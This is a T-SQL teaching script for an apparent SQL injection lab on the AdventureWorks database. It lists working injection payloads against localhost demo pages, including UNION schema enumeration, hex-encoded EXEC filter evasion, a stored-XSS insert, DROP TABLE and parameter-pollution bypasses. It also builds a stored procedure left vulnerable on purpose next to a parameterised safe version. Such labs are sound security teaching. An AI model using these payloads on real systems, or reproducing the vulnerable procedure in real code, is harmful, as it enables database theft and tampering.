/* Additional websites and notes:
http://www.sqlskills.com/BLOGS/KIMBERLY/post/Little-Bobby-Tables-SQL-Injection-and-EXECUTE-AS.aspx	- Kim Tripp on SQL Injection
http://www.sqlskills.com/BLOGS/KIMBERLY/post/EXEC-and-sp_executesql-how-are-they-different.aspx		- More Kim Tripp
http://blog.spiderlabs.com/2011/07/modsecurity-sql-injection-challenge-lessons-learned.html			- SQL injection challenge
http://www.asciitable.com/																			- ASCII table
http://msdn.microsoft.com/en-us/library/ff648339.aspx												- How to protect .Net code from SQL injection
https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk&pli=1						- SQL injection pocket reference
*/

--Various strings which we can use when performing SQL injection attacks.  These should be tried on the QueryDriven.aspx page; some of the other pages
--are susceptible, but may require slightly different syntax.
/*
The ways in which we inject bad stuff:
	f%' OR 1 = 1--
	SHOOOO%' UNION select TABLE_SCHEMA + '.' + TABLE_NAME, 1, 1 from INFORMATION_SCHEMA.TABLES--
	SHOOOO%' UNION select COLUMN_NAME + '; ' + DATA_TYPE, case when IS_NULLABLE = 'NO' then 0 else 1 end, ORDINAL_POSITION from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'ProductSubcategory' and TABLE_SCHEMA = 'Production'--
	SHOOOO%' UNION select COLUMN_NAME + '; ' + DATA_TYPE, case when IS_NULLABLE = 'NO' then 0 else 1 end, ORDINAL_POSITION from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'ProductCategory' and TABLE_SCHEMA = 'Production'--
	SHOOOO%' UNION select Name, 0, ProductCategoryId from Production.ProductCategory--
	SHOOOO%'; insert into Production.ProductSubcategory(ProductCategoryID, Name, rowguid, ModifiedDate) values(2, 'Evil Hacker Subcategory', NEWID(), CURRENT_TIMESTAMP);--

	#This stops the Slightly Less Naive Stop
	SHOOOO%' UNION select	TABLE_SCHEMA + '.' + TABLE_NAME, 1, 1 from INFORMATION_SCHEMA.TABLES--

	#Yeah, just keep trying.  See what you get!
	select cast('select	TABLE_SCHEMA + ''.'' + TABLE_NAME as Name, 1 as IsActive, 1 as SortOrder from INFORMATION_SCHEMA.TABLES' as varbinary(8000))
	declare @shmoo varchar(8000); set @shmoo = CAST(0x73656C656374095441424C455F534348454D41202B20272E27202B205441424C455F4E414D45206173204E616D652C20312061732049734163746976652C203120617320536F72744F726465722066726F6D20494E464F524D4154494F4E5F534348454D412E5441424C4553 as varchar(8000)); exec(@shmoo);

	select CAST('insert into Production.ProductSubcategory(ProductCategoryID, Name, rowguid, ModifiedDate) values(1, ''<script type="text/javascript">alert("A")</script>'', NEWID(), CURRENT_TIMESTAMP);' as varbinary(8000));
	declare @shmooi varchar(8000); set @shmooi = CAST(0x696E7365727420696E746F2050726F64756374696F6E2E50726F6475637453756263617465676F72792850726F6475637443617465676F727949442C204E616D652C20726F77677569642C204D6F64696669656444617465292076616C75657328312C20273C73637269707420747970653D22746578742F6A617661736372697074223E616C65727428224122293C2F7363726970743E272C204E4557494428292C2043555252454E545F54494D455354414D50293B as varchar(8000)); exec(@shmooi);
*/

/*
Querystring injection:
	#09	tab
	#20	space
	#25	%
	#26 &
	#27	'
	#2A *
	#2B	+
	#2C	,
	#2D	-
	#2E	.
	#2F /
	#3D	=

	#Test cases (assuming you created an IIS application called SQLInjectionWorkbench.  If you're using Visual Studio's built-in editor, add your port to the URLs.
	http://localhost/SQLInjectionWorkbench/QueryDriven.aspx?search=prevention%25%27%20or%201%3D1%2D%2D	

	#The Slightly Less Naive Stop prevents this one.
	http://localhost/SQLInjectionWorkbench/QueryDriven.aspx?search=prevention%25%27%20union%20select%20table_schema%2B%27%2E%27%2BTABLE_NAME%20as%20Name%2C1%2C1%20from%20information_schema.tables%2D%2D

	#But this goes right through.
	http://localhost/SQLInjectionWorkbench/QueryDriven.aspx?search=prevention%25%27%20union%20select%09table_schema%2B%27%2E%27%2BTABLE_NAME%20as%20Name%2C1%2C1%20from%20information_schema.tables%2D%2D

	#Especially pernicious:  HTTP Parameter Pollution.  In ASP.NET, including a parameter multiple times
	#causes different versions to be concatenated.
	http://localhost/SQLInjectionWorkbench/QueryDriven.aspx?search=36&search=jump&search=street
	#This can be used for evil as well, to get around our filtering...
	#Note that we don't need the %20 after the select anymore:  we have /* and */ first.
	http://localhost/SQLInjectionWorkbench/QueryDriven.aspx?search=prevention%25%27%20union%20select%2F%2A&search=%2A%2F%20table_schema%2B%27%2E%27%2BTABLE_NAME%20as%20Name%2C1%2C1%20from%20information_schema.tables%2D%2D
*/	

-- SPDriven:  SQL injection will not work here, period.  Make sure to run this before clicking the button the SPDriven.aspx page.
GO
create procedure Production.GetProductSubcategoryByName
	@Filter nvarchar(50)
as
	select 
		Name,
		ProductSubcategoryID,
		ProductCategoryID
	from
		Production.ProductSubcategory
	where
		Name like '%' + @Filter + '%';
GO

-- For SPWrong, I like to create a Test table beforehand and show how easy it is to drop that table.  We can't really populate the grid, but that doesn't
--stop us from performing other nefarious actions.
GO
create table Test ( Id int );
GO

/*	
	' DROP TABLE test--
*/

-- InsecureDynamicSPDriven.  Make sure to run this before clicking the button on the InsecureDynamicSPDriven.aspx page.
GO
create procedure Production.GetProductSubcategoryByName_Dynamic_Incorrect
	@Filter nvarchar(500)
as
	declare @sql varchar(250);
	set @sql = 'select Name, ProductSubcategoryID, ProductCategoryID from Production.ProductSubcategory where Name like ''%' + @Filter + '%'';';
	exec(@sql);
GO

	-- Easy to perform an attack from SSMS:
	exec Production.GetProductSubcategoryByName_Dynamic_Incorrect @Filter='SHOOOO%'' UNION select TABLE_SCHEMA + ''.'' + TABLE_NAME, 1, 1 from INFORMATION_SCHEMA.TABLES--';
	--This is also as easy to perform a SQL injection attack against as an ad hoc SQL example; in fact, the syntax is exactly the same.

-- SecureDynamicSPDriven.  Make sure to run this before clicking the button on the SecureDynamicSPDriven.aspx page.
GO
create procedure Production.GetProductSubcategoryByName_Dynamic_Correct
	@Filter nvarchar(500)
as
	declare @sql nvarchar(250);
	set @sql = N'select * from Production.ProductSubcategory where Name like ''%'' + @InFilter + ''%'';';
	exec sp_executesql @sql, N'@InFilter varchar(50)', @Filter;
GO

	--Completely safe from SQL injection.
	exec Production.GetProductSubcategoryByName_Dynamic_Correct @Filter='SHOOOO%'' UNION select TABLE_SCHEMA + ''.'' + TABLE_NAME, 1, 1 from INFORMATION_SCHEMA.TABLES--';

/* Cleaning up your AdventureWorks database by getting rid of our new procedures. */
drop procedure Production.GetProductSubcategoryByName;
drop procedure Production.GetProductSubcategoryByName_Dynamic_Incorrect;
drop procedure Production.GetProductSubcategoryByName_Dynamic_Correct;